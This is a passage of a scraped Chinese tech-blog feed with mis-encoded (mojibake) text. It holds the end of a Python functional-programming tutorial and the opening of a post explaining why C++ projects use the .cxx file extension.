<span class="hljs-comment"># ä½¿ç”¨å‡½æ•°ç»„åˆæ„å»ºå¤æ‚æ“ä½œ</span>
process_numbers = pipe(
    filter_even,    <span class="hljs-comment"># ç¬¬ä¸€æ­¥ï¼šç­›é€‰å¶æ•°</span>
    square_all,     <span class="hljs-comment"># ç¬¬äºŒæ­¥ï¼šæ±‚å¹³æ–¹</span>
    sum_all         <span class="hljs-comment"># ç¬¬ä¸‰æ­¥ï¼šæ±‚å’Œ</span>
)

<span class="hljs-comment"># æµ‹è¯•å‡½æ•°ç»„åˆ</span>
numbers = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>]
result = process_numbers(numbers)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"å¤„ç†ç»“æœ: <span class="hljs-subst">{result}</span>"</span>)  <span class="hljs-comment"># 4 + 16 + 36 = 56</span>

<span class="hljs-comment"># æŸ¯é‡ŒåŒ–å‡½æ•°çš„ä½¿ç”¨</span>
add_five = add(<span class="hljs-number">5</span>)
multiply_by_three = multiply(<span class="hljs-number">3</span>)

<span class="hljs-built_in">print</span>(<span class="hljs-string">f"5 + 10 = <span class="hljs-subst">{add_five(<span class="hljs-number">10</span>)}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"3 Ã— 7 = <span class="hljs-subst">{multiply_by_three(<span class="hljs-number">7</span>)}</span>"</span>)

<span class="hljs-comment"># ç»„åˆæŸ¯é‡ŒåŒ–å‡½æ•°</span>
add_then_multiply = compose(multiply_by_three, add_five)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"(5 + 10) Ã— 3 = <span class="hljs-subst">{add_then_multiply(<span class="hljs-number">10</span>)}</span>"</span>)
</code></pre>
<h3 data-id="heading-4">ä¸å¯å˜æ•°æ®ç»“æ„</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Dict</span>, <span class="hljs-type">List</span>, <span class="hljs-type">Any</span>
<span class="hljs-keyword">from</span> copy <span class="hljs-keyword">import</span> deepcopy

<span class="hljs-keyword">def</span> <span class="hljs-title function_">update_in</span>(<span class="hljs-params">data: <span class="hljs-type">Dict</span>, keys: <span class="hljs-type">List</span>, value: <span class="hljs-type">Any</span></span>) -&gt; <span class="hljs-type">Dict</span>:
    <span class="hljs-string">"""ä¸å¯å˜åœ°æ›´æ–°åµŒå¥—å­—å…¸çš„ç‰¹å®šè·¯å¾„"""</span>
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(keys) == <span class="hljs-number">0</span>:
        <span class="hljs-keyword">return</span> value
    
    key = keys[<span class="hljs-number">0</span>]
    remaining_keys = keys[<span class="hljs-number">1</span>:]
    
    <span class="hljs-comment"># åˆ›å»ºæ•°æ®çš„æ·±æ‹·è´</span>
    new_data = deepcopy(data)
    
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(new_data, <span class="hljs-built_in">dict</span>):
        <span class="hljs-keyword">if</span> key <span class="hljs-keyword">in</span> new_data:
            new_data[key] = update_in(new_data[key], remaining_keys, value)
        <span class="hljs-keyword">else</span>:
            new_data[key] = update_in({}, remaining_keys, value)
    <span class="hljs-keyword">else</span>:
        <span class="hljs-comment"># å¦‚æœä¸æ˜¯å­—å…¸ï¼Œåˆ›å»ºæ–°çš„å­—å…¸ç»“æ„</span>
        new_data = {key: update_in({}, remaining_keys, value)}
    
    <span class="hljs-keyword">return</span> new_data

<span class="hljs-keyword">def</span> <span class="hljs-title function_">assoc</span>(<span class="hljs-params">data: <span class="hljs-type">Dict</span>, key: <span class="hljs-built_in">str</span>, value: <span class="hljs-type">Any</span></span>) -&gt; <span class="hljs-type">Dict</span>:
    <span class="hljs-string">"""ä¸å¯å˜åœ°è®¾ç½®å­—å…¸é”®å€¼"""</span>
    new_data = data.copy()
    new_data[key] = value
    <span class="hljs-keyword">return</span> new_data

<span class="hljs-keyword">def</span> <span class="hljs-title function_">dissoc</span>(<span class="hljs-params">data: <span class="hljs-type">Dict</span>, key: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-type">Dict</span>:
    <span class="hljs-string">"""ä¸å¯å˜åœ°åˆ é™¤å­—å…¸é”®"""</span>
    new_data = data.copy()
    <span class="hljs-keyword">if</span> key <span class="hljs-keyword">in</span> new_data:
        <span class="hljs-keyword">del</span> new_data[key]
    <span class="hljs-keyword">return</span> new_data

<span class="hljs-comment"># ä½¿ç”¨ä¸å¯å˜æ•°æ®æ“ä½œ</span>
user_data = {
    <span class="hljs-string">"name"</span>: <span class="hljs-string">"å¼ ä¸‰"</span>,
    <span class="hljs-string">"age"</span>: <span class="hljs-number">25</span>,
    <span class="hljs-string">"address"</span>: {
        <span class="hljs-string">"city"</span>: <span class="hljs-string">"åŒ—äº¬"</span>,
        <span class="hljs-string">"street"</span>: <span class="hljs-string">"æœé˜³è·¯"</span>
    },
    <span class="hljs-string">"hobbies"</span>: [<span class="hljs-string">"é˜…è¯»"</span>, <span class="hljs-string">"ç¼–ç¨‹"</span>]
}

<span class="hljs-built_in">print</span>(<span class="hljs-string">"åŸå§‹æ•°æ®:"</span>, user_data)

<span class="hljs-comment"># ä¸å¯å˜æ›´æ–°</span>
new_user = assoc(user_data, <span class="hljs-string">"age"</span>, <span class="hljs-number">26</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"æ›´æ–°å¹´é¾„å:"</span>, new_user)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"åŸå§‹æ•°æ®æœªæ”¹å˜:"</span>, user_data[<span class="hljs-string">"age"</span>])

<span class="hljs-comment"># åˆ é™¤å±æ€§</span>
user_without_age = dissoc(user_data, <span class="hljs-string">"age"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"åˆ é™¤å¹´é¾„å:"</span>, user_without_age)

<span class="hljs-comment"># æ·±å±‚æ›´æ–°</span>
updated_user = update_in(user_data, [<span class="hljs-string">"address"</span>, <span class="hljs-string">"city"</span>], <span class="hljs-string">"ä¸Šæµ·"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"æ›´æ–°åŸå¸‚å:"</span>, updated_user)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"åŸå§‹åœ°å€æœªæ”¹å˜:"</span>, user_data[<span class="hljs-string">"address"</span>][<span class="hljs-string">"city"</span>])
</code></pre>
<h3 data-id="heading-5">å‡½æ•°å¼æ•°æ®å¤„ç†</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> partial
<span class="hljs-keyword">from</span> operator <span class="hljs-keyword">import</span> itemgetter, attrgetter

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Product</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name: <span class="hljs-built_in">str</span>, price: <span class="hljs-built_in">float</span>, category: <span class="hljs-built_in">str</span></span>):
        self.name = name
        self.price = price
        self.category = category
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">return</span> <span class="hljs-string">f"Product(<span class="hljs-subst">{self.name}</span>, $<span class="hljs-subst">{self.price}</span>, <span class="hljs-subst">{self.category}</span>)"</span>

<span class="hljs-comment"># åˆ›å»ºäº§å“åˆ—è¡¨</span>
products = [
    Product(<span class="hljs-string">"ç¬”è®°æœ¬ç”µè„‘"</span>, <span class="hljs-number">5999</span>, <span class="hljs-string">"ç”µå­äº§å“"</span>),
    Product(<span class="hljs-string">"æ™ºèƒ½æ‰‹æœº"</span>, <span class="hljs-number">3999</span>, <span class="hljs-string">"ç”µå­äº§å“"</span>),
    Product(<span class="hljs-string">"ä¹¦ç±"</span>, <span class="hljs-number">49</span>, <span class="hljs-string">"æ–‡æ•™ç”¨å“"</span>),
    Product(<span class="hljs-string">"å’–å•¡"</span>, <span class="hljs-number">35</span>, <span class="hljs-string">"é£Ÿå“é¥®æ–™"</span>),
    Product(<span class="hljs-string">"é¼ æ ‡"</span>, <span class="hljs-number">89</span>, <span class="hljs-string">"ç”µå­äº§å“"</span>),
    Product(<span class="hljs-string">"ç¬”è®°æœ¬"</span>, <span class="hljs-number">15</span>, <span class="hljs-string">"æ–‡æ•™ç”¨å“"</span>)
]

<span class="hljs-comment"># å‡½æ•°å¼æ•°æ®å¤„ç†ç®¡é“</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">create_data_pipeline</span>(<span class="hljs-params">*transformations</span>):
    <span class="hljs-string">"""åˆ›å»ºæ•°æ®å¤„ç†ç®¡é“"""</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">pipeline</span>(<span class="hljs-params">data</span>):
        <span class="hljs-keyword">return</span> reduce(<span class="hljs-keyword">lambda</span> d, transform: transform(d), 
                     transformations, data)
    <span class="hljs-keyword">return</span> pipeline

<span class="hljs-comment"># å„ç§æ•°æ®å¤„ç†å‡½æ•°</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">filter_by_category</span>(<span class="hljs-params">category: <span class="hljs-built_in">str</span></span>):
    <span class="hljs-string">"""æŒ‰ç±»åˆ«ç­›é€‰çš„æŸ¯é‡ŒåŒ–å‡½æ•°"""</span>
    <span class="hljs-keyword">return</span> partial(<span class="hljs-built_in">filter</span>, <span class="hljs-keyword">lambda</span> p: p.category == category)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">filter_by_price</span>(<span class="hljs-params">max_price: <span class="hljs-built_in">float</span></span>):
    <span class="hljs-string">"""æŒ‰ä»·æ ¼ç­›é€‰çš„æŸ¯é‡ŒåŒ–å‡½æ•°"""</span>
    <span class="hljs-keyword">return</span> partial(<span class="hljs-built_in">filter</span>, <span class="hljs-keyword">lambda</span> p: p.price &lt;= max_price)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">sort_by_price</span>(<span class="hljs-params">descending: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">False</span></span>):
    <span class="hljs-string">"""æŒ‰ä»·æ ¼æ’åºçš„æŸ¯é‡ŒåŒ–å‡½æ•°"""</span>
    <span class="hljs-keyword">return</span> partial(<span class="hljs-built_in">sorted</span>, key=attrgetter(<span class="hljs-string">'price'</span>), reverse=descending)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_names</span>():
    <span class="hljs-string">"""æå–äº§å“åç§°"""</span>
    <span class="hljs-keyword">return</span> partial(<span class="hljs-built_in">map</span>, attrgetter(<span class="hljs-string">'name'</span>))

<span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate_total_price</span>():
    <span class="hljs-string">"""è®¡ç®—æ€»ä»·æ ¼"""</span>
    <span class="hljs-keyword">return</span> partial(reduce, <span class="hljs-keyword">lambda</span> total, p: total + p.price)

<span class="hljs-comment"># æ„å»ºå¤æ‚çš„æ•°æ®å¤„ç†ç®¡é“</span>
affordable_electronics = create_data_pipeline(
    filter_by_category(<span class="hljs-string">"ç”µå­äº§å“"</span>),
    filter_by_price(<span class="hljs-number">5000</span>),
    sort_by_price(descending=<span class="hljs-literal">True</span>)
)

cheap_product_names = create_data_pipeline(
    filter_by_price(<span class="hljs-number">100</span>),
    get_names(),
    <span class="hljs-built_in">list</span>
)

total_electronics_price = create_data_pipeline(
    filter_by_category(<span class="hljs-string">"ç”µå­äº§å“"</span>),
    calculate_total_price()
)

<span class="hljs-comment"># ä½¿ç”¨æ•°æ®å¤„ç†ç®¡é“</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"å®æƒ çš„ç”µå­äº§å“:"</span>)
<span class="hljs-keyword">for</span> product <span class="hljs-keyword">in</span> affordable_electronics(products):
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  <span class="hljs-subst">{product}</span>"</span>)

<span class="hljs-built_in">print</span>(<span class="hljs-string">f"\nä¾¿å®œå•†å“åç§°: <span class="hljs-subst">{<span class="hljs-built_in">list</span>(cheap_product_names(products))}</span>"</span>)

<span class="hljs-comment"># æ³¨æ„ï¼šcalculate_total_price è¿”å›çš„æ˜¯reduceå‡½æ•°ï¼Œéœ€è¦ä¼ å…¥åˆå§‹å€¼0</span>
electronics_price = total_electronics_price(products)(<span class="hljs-number">0</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"ç”µå­äº§å“æ€»ä»·: $<span class="hljs-subst">{electronics_price}</span>"</span>)
</code></pre>
<h3 data-id="heading-6">é€’å½’å’Œæƒ°æ€§æ±‚å€¼</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> islice

<span class="hljs-keyword">def</span> <span class="hljs-title function_">fibonacci</span>():
    <span class="hljs-string">"""ç”Ÿæˆæ— é™æ–æ³¢é‚£å¥‘æ•°åˆ—ï¼ˆæƒ°æ€§æ±‚å€¼ï¼‰"""</span>
    a, b = <span class="hljs-number">0</span>, <span class="hljs-number">1</span>
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
        <span class="hljs-keyword">yield</span> a
        a, b = b, a + b

<span class="hljs-keyword">def</span> <span class="hljs-title function_">recursive_sum</span>(<span class="hljs-params">numbers: <span class="hljs-type">List</span>[<span class="hljs-built_in">int</span>]</span>) -&gt; <span class="hljs-built_in">int</span>:
    <span class="hljs-string">"""é€’å½’æ–¹å¼æ±‚å’Œ"""</span>
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> numbers:
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>
    <span class="hljs-keyword">return</span> numbers[<span class="hljs-number">0</span>] + recursive_sum(numbers[<span class="hljs-number">1</span>:])

<span class="hljs-keyword">def</span> <span class="hljs-title function_">recursive_max</span>(<span class="hljs-params">numbers: <span class="hljs-type">List</span>[<span class="hljs-built_in">int</span>]</span>) -&gt; <span class="hljs-built_in">int</span>:
    <span class="hljs-string">"""é€’å½’æ–¹å¼æ±‚æœ€å¤§å€¼"""</span>
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(numbers) == <span class="hljs-number">1</span>:
        <span class="hljs-keyword">return</span> numbers[<span class="hljs-number">0</span>]
    
    rest_max = recursive_max(numbers[<span class="hljs-number">1</span>:])
    <span class="hljs-keyword">return</span> numbers[<span class="hljs-number">0</span>] <span class="hljs-keyword">if</span> numbers[<span class="hljs-number">0</span>] &gt; rest_max <span class="hljs-keyword">else</span> rest_max

<span class="hljs-keyword">def</span> <span class="hljs-title function_">trampoline</span>(<span class="hljs-params">func</span>):
    <span class="hljs-string">"""è¹¦åºŠå‡½æ•°ï¼šä¼˜åŒ–é€’å½’ï¼Œé˜²æ­¢æ ˆæº¢å‡º"""</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">trampolined</span>(<span class="hljs-params">*args, **kwargs</span>):
        result = func(*args, **kwargs)
        <span class="hljs-keyword">while</span> <span class="hljs-built_in">callable</span>(result):
            result = result()
        <span class="hljs-keyword">return</span> result
    <span class="hljs-keyword">return</span> trampolined

<span class="hljs-comment"># ä½¿ç”¨æƒ°æ€§åºåˆ—</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"æ–æ³¢é‚£å¥‘æ•°åˆ—å‰10é¡¹:"</span>)
fib_sequence = islice(fibonacci(), <span class="hljs-number">10</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>(fib_sequence))

<span class="hljs-comment"># ä½¿ç”¨é€’å½’å‡½æ•°</span>
numbers = [<span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">9</span>, <span class="hljs-number">2</span>]
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"é€’å½’æ±‚å’Œ: <span class="hljs-subst">{recursive_sum(numbers)}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"é€’å½’æ±‚æœ€å¤§å€¼: <span class="hljs-subst">{recursive_max(numbers)}</span>"</span>)

<span class="hljs-comment"># è®°å¿†åŒ–è£…é¥°å™¨ï¼ˆç¼“å­˜å‡½æ•°ç»“æœï¼‰</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">memoize</span>(<span class="hljs-params">func</span>):
    <span class="hljs-string">"""è®°å¿†åŒ–è£…é¥°å™¨ï¼šç¼“å­˜å‡½æ•°è®¡ç®—ç»“æœ"""</span>
    cache = {}
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">memoized</span>(<span class="hljs-params">*args</span>):
        <span class="hljs-keyword">if</span> args <span class="hljs-keyword">in</span> cache:
            <span class="hljs-keyword">return</span> cache[args]
        result = func(*args)
        cache[args] = result
        <span class="hljs-keyword">return</span> result
    
    <span class="hljs-keyword">return</span> memoized

<span class="hljs-meta">@memoize</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">factorial</span>(<span class="hljs-params">n: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:
    <span class="hljs-string">"""è®°å¿†åŒ–çš„é˜¶ä¹˜å‡½æ•°"""</span>
    <span class="hljs-keyword">if</span> n &lt;= <span class="hljs-number">1</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>
    <span class="hljs-keyword">return</span> n * factorial(n - <span class="hljs-number">1</span>)

<span class="hljs-built_in">print</span>(<span class="hljs-string">f"\nè®°å¿†åŒ–é˜¶ä¹˜:"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"5! = <span class="hljs-subst">{factorial(<span class="hljs-number">5</span>)}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"10! = <span class="hljs-subst">{factorial(<span class="hljs-number">10</span>)}</span>"</span>)
<span class="hljs-comment"># ç¬¬äºŒæ¬¡è°ƒç”¨ä¼šä½¿ç”¨ç¼“å­˜</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"5! (ç¼“å­˜) = <span class="hljs-subst">{factorial(<span class="hljs-number">5</span>)}</span>"</span>)
</code></pre>
<h2 data-id="heading-7">å‡½æ•°å¼ç¼–ç¨‹åŸåˆ™</h2>
<ol>
<li>çº¯å‡½æ•°ä¼˜å…ˆ</li>
<li>ä¸å¯å˜æ€§åŸåˆ™</li>
<li>å£°æ˜å¼ç¼–ç¨‹</li>
<li>ç»„åˆä¼˜äºç»§æ‰¿</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸ºä»€ä¹ˆC++é¡¹ç›®åçˆ±.cxxæ‰©å±•åï¼šä»MongoDBé©±åŠ¨è¯´èµ·]]></title>    <link>https://juejin.cn/post/7576894999095689243</link>    <guid>https://juejin.cn/post/7576894999095689243</guid>    <pubDate>2025-11-27T01:02:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576894999095689243" data-draft-id="7576894999095656475" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸ºä»€ä¹ˆC++é¡¹ç›®åçˆ±.cxxæ‰©å±•åï¼šä»MongoDBé©±åŠ¨è¯´èµ·"/> <meta itemprop="keywords" content="C++"/> <meta itemprop="datePublished" content="2025-11-27T01:02:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è‡ªç”±ç”Ÿé•¿2024"/> <meta itemprop="url" content="https://juejin.cn/user/1591748569862670"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸ºä»€ä¹ˆC++é¡¹ç›®åçˆ±.cxxæ‰©å±•åï¼šä»MongoDBé©±åŠ¨è¯´èµ·
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1591748569862670/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è‡ªç”±ç”Ÿé•¿2024
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T01:02:37.000Z" title="Thu Nov 27 2025 01:02:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    10
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æ‘˜è¦ï¼šC++æ‰©å±•åé€‰ç”¨.cxxè€Œé.cppï¼ŒæºäºUnixå†å²ï¼šcppå‘½ä»¤æ—©è¢«Cé¢„å¤„ç†å™¨å ç”¨ï¼Œä¸ºé¿å…å†²çªè¡ç”Ÿå‡º.cxxã€.ccç­‰å˜ä½“ã€‚mongocxxéµå¾ªè¿™ä¸€ä¼ ç»Ÿï¼Œä½“ç°äº†C++ç”Ÿæ€çš„å†å²ä¼ æ‰¿ã€‚ç°ä»£é¡¹ç›®è™½å¤šç”¨.cppï¼Œä½†.cxxä»æ˜¯è€ç‰Œåº“çš„å¸¸è§é€‰æ‹©ï¼Œæ„å»ºå·¥å…·å‡èƒ½å¦¥å–„æ”¯æŒã€‚</p>
<h2 data-id="heading-0">ä¸ºä»€ä¹ˆC++é¡¹ç›®åçˆ±.cxxæ‰©å±•åï¼šä»MongoDBé©±åŠ¨è¯´èµ·</h2>
<h3 data-id="heading-1">ä¸€ä¸ªä»¤äººå›°æƒ‘çš„å‘ç°</h3>
<p>å½“ä½ ç¬¬ä¸€æ¬¡æ¥è§¦MongoDBçš„C++é©±åŠ¨æ—¶ï¼Œå¯èƒ½ä¼šæ„Ÿåˆ°ç–‘æƒ‘ï¼šä¸ºä»€ä¹ˆå®ƒå«<code>mongocxx</code>è€Œä¸æ˜¯æ›´ç›´è§‚çš„<code>mongocpp</code>ï¼Ÿè¿™èƒŒåå…¶å®éšè—ç€C++å‘å±•å²ä¸Šçš„ä¸€æ®µæœ‰è¶£æ•…äº‹ã€‚</p>
<h3 data-id="heading-2">ç½ªé­ç¥¸é¦–ï¼šè¢«å ç”¨çš„<code>cpp</code>å‘½ä»¤</h3>
<h4 data-id="heading-3">Unixç³»ç»Ÿçš„å†å²é—äº§</h4>
<p>åœ¨Unix/Linuxç³»ç»Ÿä¸­ï¼Œ<code>cpp</code>è¿™ä¸ªå‘½ä»¤åæ—©åœ¨ä¸Šä¸–çºª70å¹´ä»£å°±è¢«Cé¢„å¤„ç†å™¨ï¼ˆC Preprocessorï¼‰å æ®äº†ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">$ <span class="hljs-built_in">which</span> cpp
/usr/bin/cpp

$ cpp --version
cpp (GCC) 9.3.0
Copyright Â© 2020 Free Software Foundation, Inc.
</code></pre>
<h4 data-id="heading-4">å‘½åå†²çªçš„ç°å®å›°å¢ƒ</h4>
<p>å¦‚æœC++ç¼–è¯‘å™¨ä¹Ÿå‘½åä¸º<code>cpp</code>ï¼Œä¼šå¯¼è‡´ä¸¥é‡æ··ä¹±ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å‡è®¾ä¸¤ä¸ªå‘½ä»¤éƒ½å«cppï¼Œä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ</span>
cpp my_program.cpp    <span class="hljs-comment"># è¿™æ˜¯è°ƒç”¨é¢„å¤„ç†å™¨è¿˜æ˜¯ç¼–è¯‘å™¨ï¼Ÿ</span>
</code></pre>
<p>è¿™ç§å†²çªåœ¨æ„å»ºå·¥å…·å’ŒMakefileä¸­å°¤ä¸ºæ˜æ˜¾ï¼Œç³»ç»Ÿæ— æ³•åŒºåˆ†ä½ åˆ°åº•è¦è°ƒç”¨å“ªä¸ªå·¥å…·ã€‚</p>
<h3 data-id="heading-5">C++æ‰©å±•åçš„"æˆ˜å›½æ—¶ä»£"</h3>
